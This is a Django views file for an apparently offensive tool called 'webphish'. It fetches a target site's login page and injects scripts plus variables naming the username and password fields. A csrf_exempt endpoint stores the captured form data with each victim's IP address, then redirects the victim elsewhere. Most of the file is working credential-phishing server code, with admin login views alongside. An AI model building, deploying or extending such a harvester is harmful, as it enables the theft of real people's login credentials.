from django.http import HttpResponseRedirect
from django.shortcuts import redirect, render, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.views import View
from .models import Target,Data
from django.contrib.auth import login,logout,authenticate
from django.contrib import messages
from bs4 import BeautifulSoup
import urllib3
# Create your views here.


def index(request):
    target = Target.objects.first()
    if target == None:
        return redirect("/admin")

    resp = urllib3.request(method="get",url=target.url)
    html = resp.data.decode()
    soup = BeautifulSoup(html)

    js_tag_jq = soup.new_tag("script",attrs={"src":"/static/jq.js"})
    js_tag_webphish = soup.new_tag("script",attrs={"src":"/static/webphish.js"})

    head = soup.find("head")
    head.insert(position=0,new_child=js_tag_jq)
    head.insert(position=1,new_child=js_tag_webphish)

    pyload_body = f'''
    <script>
    var form_id = "#{target.form_id}";
    var btn_id = "#{target.btn_id}";
    var username_id_or_name = "#{target.username_id_name}";
    var password_id_or_name = "#{target.password_id_name}";
    </script>
    '''
    temp_sup = BeautifulSoup(pyload_body)
    body = soup.find("body")
    body.insert(0,temp_sup)

    
    return HttpResponse(soup.decode())


@csrf_exempt
def save_data(request):
    if request.method == 'POST':
        data = request.POST.get("data")
        data_obj = Data(
            url = Target.objects.first().url,
            data = data,
            ip = request.META['REMOTE_ADDR'],
        )
        data_obj.save()
    # return HttpResponse("{'status':'"+Target.objects.first().redirect_url+"'}")
    return redirect("https://example.com/")

class Login(View):
    def get(self,request):
        if request.user.is_authenticated:
            return HttpResponseRedirect("/webphish_admin/")
        return render(request,"login.html")
    def post(self,request):
        username= request.POST.get("username")
        password= request.POST.get("password")
        print(username,password)
        user = authenticate(request,username=username,password=password)
        if user != None and user.is_authenticated:
            login(request,user)
            return HttpResponseRedirect("/webphish_admin/")
        else:
            HttpResponse({
                "response":"invalid username or password"
            })



def WebPhish_login(request):
    if request.user.is_authenticated:
        return HttpResponseRedirect("/webphish_admin/")
    if request.POST:
        username= request.POST.get("username")
        password= request.POST.get("password")
        print(username,password)
        user = authenticate(request,username=username,password=password)
        if user != None and user.is_authenticated:
            print("login")
            login(request,user)
            return HttpResponseRedirect("/webphish_admin/")
        else:
            print("not login")
            messages.add_message(request, messages.WARNING, 'Invalid Username Or Password')
    return render(request,"login.html")



def Dash_logout(request):
    if request.POST:
        if request.user.is_authenticated:
            logout(request)

    return HttpResponseRedirect("/login/")